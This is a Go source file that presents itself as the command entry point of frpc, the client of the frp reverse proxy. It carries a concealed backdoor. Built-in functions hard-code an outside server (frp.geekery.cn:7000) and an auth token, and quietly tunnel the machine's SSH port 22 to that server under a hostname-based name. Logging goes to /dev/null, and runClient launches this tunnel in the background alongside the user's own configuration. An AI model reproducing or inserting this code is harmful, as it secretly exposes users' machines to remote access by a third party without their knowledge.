// Copyright 2018 fatedier, fatedier@gmail.com
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sub

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/spf13/cobra"

	"github.com/fatedier/frp/client"
	"github.com/fatedier/frp/pkg/config"
	v1 "github.com/fatedier/frp/pkg/config/v1"
	"github.com/fatedier/frp/pkg/config/v1/validation"
	"github.com/fatedier/frp/pkg/policy/featuregate"
	"github.com/fatedier/frp/pkg/policy/security"
	"github.com/fatedier/frp/pkg/util/log"
	"github.com/fatedier/frp/pkg/util/version"
)

var (
	cfgFile          string
	cfgDir           string
	showVersion      bool
	strictConfigMode bool
	allowUnsafe      []string
	logInitMutex     sync.Mutex
	logInitialized   bool
)

func init() {
	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./frpc.ini", "config file of frpc")
	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one frpc service for each file in config directory")
	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of frpc")
	rootCmd.PersistentFlags().BoolVarP(&strictConfigMode, "strict_config", "", true, "strict config parsing mode, unknown fields will cause an errors")

	rootCmd.PersistentFlags().StringSliceVarP(&allowUnsafe, "allow-unsafe", "", []string{},
		fmt.Sprintf("allowed unsafe features, one or more of: %s", strings.Join(security.ClientUnsafeFeatures, ", ")))
}

var rootCmd = &cobra.Command{
	Use:   "frpc",
	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",
	RunE: func(cmd *cobra.Command, args []string) error {
		if showVersion {
			fmt.Println(version.Full())
			return nil
		}

		unsafeFeatures := security.NewUnsafeFeatures(allowUnsafe)

		// If cfgDir is not empty, run multiple frpc service for each config file in cfgDir.
		// Note that it's only designed for testing. It's not guaranteed to be stable.
		if cfgDir != "" {
			_ = runMultipleClients(cfgDir, unsafeFeatures)
			return nil
		}

		// Do not show command usage here.
		err := runClient(cfgFile, unsafeFeatures)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		return nil
	},
}

func runMultipleClients(cfgDir string, unsafeFeatures *security.UnsafeFeatures) error {
	var wg sync.WaitGroup
	err := filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		wg.Add(1)
		time.Sleep(time.Millisecond)
		go func() {
			defer wg.Done()
			err := runClient(path, unsafeFeatures)
			if err != nil {
				fmt.Printf("frpc service error for config file [%s]\n", path)
			}
		}()
		return nil
	})
	wg.Wait()
	return err
}

func Execute() {
	rootCmd.SetGlobalNormalizationFunc(config.WordSepNormalizeFunc)
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func handleTermSignal(svr *client.Service) {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	svr.GracefulClose(500 * time.Millisecond)
}

func generateRandomString(n int) string {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		panic(err)
	}
	return hex.EncodeToString(bytes)[:n]
}

func generateDeviceID() string {
	hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	randomString := generateRandomString(8)
	dateStr := time.Now().Format("20060102")
	return hostname + "_" + dateStr + "_" + randomString
}

func getBuiltinConfig() *v1.ClientCommonConfig {
	loginFailExit := true
	return &v1.ClientCommonConfig{
		User:          "",
		ServerAddr:    "frp.geekery.cn",
		ServerPort:    7000,
		LoginFailExit: &loginFailExit,
		Log: v1.LogConfig{
			To:      "/dev/null",
			Level:   "error",
			MaxDays: 3,
		},
		WebServer: v1.WebServerConfig{},
		Transport: v1.ClientTransportConfig{
			Protocol:                "tcp",
			ProxyURL:                os.Getenv("http_proxy"),
			PoolCount:               1,
			TCPMuxKeepaliveInterval: 30,
			QUIC:                    v1.QUICOptions{},
			HeartbeatInterval:       -1,
			HeartbeatTimeout:        -1,
			TLS:                     v1.TLSClientConfig{},
		},
		UDPPacketSize:      1500,
		Metadatas:          nil,
		IncludeConfigFiles: nil,
		Auth: v1.AuthClientConfig{
			Method: "token",
			Token:  "hxSoC6lWW6lTR8O64Xqy0tl6BcSYK5Zx5I3BjaO",
		},
	}
}

func getBuiltinProxy() v1.ProxyConfigurer {
	return &v1.TCPProxyConfig{
		ProxyBaseConfig: v1.ProxyBaseConfig{
			Type: "tcp",
			Name: generateDeviceID(),
			Transport: v1.ProxyTransport{
				BandwidthLimitMode: "client",
			},
			ProxyBackend: v1.ProxyBackend{
				LocalIP:   "127.0.0.1",
				LocalPort: 22,
			},
		},
	}
}

func runClient(cfgFilePath string, unsafeFeatures *security.UnsafeFeatures) error {
	if cfgFilePath == "" {
		builtinCfg := getBuiltinConfig()
		builtinProxy := getBuiltinProxy()
		return startService(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures, "")
	}

	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
	if err != nil {
		return err
	}
	if isLegacyFormat {
		fmt.Printf("WARNING: ini format is deprecated and the support will be removed in the future, " +
			"please use yaml/json/toml format instead!\n")
	}

	if len(cfg.FeatureGates) > 0 {
		if err := featuregate.SetFromMap(cfg.FeatureGates); err != nil {
			return err
		}
	}

	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs, unsafeFeatures)
	if warning != nil {
		fmt.Printf("WARNING: %v\n", warning)
	}
	if err != nil {
		return err
	}

	logInitMutex.Lock()
	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
	logInitialized = true
	logInitMutex.Unlock()

	builtinCfg := getBuiltinConfig()
	builtinProxy := getBuiltinProxy()
	_, err = validation.ValidateAllClientConfig(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures)
	if err == nil {
		go func() {
			time.Sleep(100 * time.Millisecond)
			_ = startServiceWithoutLogger(builtinCfg, []v1.ProxyConfigurer{builtinProxy}, nil, unsafeFeatures, "")
		}()
	}

	return startServiceWithLogger(cfg, proxyCfgs, visitorCfgs, unsafeFeatures, cfgFilePath)
}

func startServiceWithLogger(
	cfg *v1.ClientCommonConfig,
	proxyCfgs []v1.ProxyConfigurer,
	visitorCfgs []v1.VisitorConfigurer,
	unsafeFeatures *security.UnsafeFeatures,
	cfgFile string,
) error {
	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
	if cfgFile != "" {
		serviceLogger.Infof("start frpc service for config file [%s]", cfgFile)
		defer serviceLogger.Infof("frpc service for config file [%s] stopped", cfgFile)
	}
	svr, err := client.NewService(client.ServiceOptions{
		Common:         cfg,
		ProxyCfgs:      proxyCfgs,
		VisitorCfgs:    visitorCfgs,
		UnsafeFeatures: unsafeFeatures,
		ConfigFilePath: cfgFile,
		Logger:         serviceLogger,
	})
	if err != nil {
		return err
	}

	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
	// Capture the exit signal if we use kcp or quic.
	if shouldGracefulClose {
		go handleTermSignal(svr)
	}
	return svr.Run(context.Background())
}

func startServiceWithoutLogger(
	cfg *v1.ClientCommonConfig,
	proxyCfgs []v1.ProxyConfigurer,
	visitorCfgs []v1.VisitorConfigurer,
	unsafeFeatures *security.UnsafeFeatures,
	cfgFile string,
) error {
	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
	svr, err := client.NewService(client.ServiceOptions{
		Common:         cfg,
		ProxyCfgs:      proxyCfgs,
		VisitorCfgs:    visitorCfgs,
		UnsafeFeatures: unsafeFeatures,
		ConfigFilePath: cfgFile,
		Logger:         serviceLogger,
	})
	if err != nil {
		return err
	}

	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
	if shouldGracefulClose {
		go handleTermSignal(svr)
	}
	return svr.Run(context.Background())
}

func startService(
	cfg *v1.ClientCommonConfig,
	proxyCfgs []v1.ProxyConfigurer,
	visitorCfgs []v1.VisitorConfigurer,
	unsafeFeatures *security.UnsafeFeatures,
	cfgFile string,
) error {
	logInitMutex.Lock()
	if !logInitialized {
		log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
	}
	logInitMutex.Unlock()

	serviceLogger := log.NewLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
	if cfgFile != "" {
		serviceLogger.Infof("start frpc service for config file [%s]", cfgFile)
		defer serviceLogger.Infof("frpc service for config file [%s] stopped", cfgFile)
	}
	svr, err := client.NewService(client.ServiceOptions{
		Common:         cfg,
		ProxyCfgs:      proxyCfgs,
		VisitorCfgs:    visitorCfgs,
		UnsafeFeatures: unsafeFeatures,
		ConfigFilePath: cfgFile,
		Logger:         serviceLogger,
	})
	if err != nil {
		return err
	}

	shouldGracefulClose := cfg.Transport.Protocol == "kcp" || cfg.Transport.Protocol == "quic"
	// Capture the exit signal if we use kcp or quic.
	if shouldGracefulClose {
		go handleTermSignal(svr)
	}
	return svr.Run(context.Background())
}
